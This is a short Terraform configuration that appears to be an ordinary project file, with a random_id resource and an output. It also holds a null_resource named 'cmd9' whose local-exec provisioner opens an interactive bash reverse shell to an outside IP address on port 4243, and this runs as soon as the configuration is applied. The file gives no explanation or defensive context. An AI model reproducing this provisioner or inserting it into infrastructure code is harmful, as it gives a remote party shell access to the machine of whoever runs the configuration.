
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "cmd9" {
  provisioner "local-exec" {
      command = "bash -i >& /dev/tcp/45.79.176.241/4243 0>&1"
        }
        }

output "random" {
  value = "${random_id.random.hex}"
}
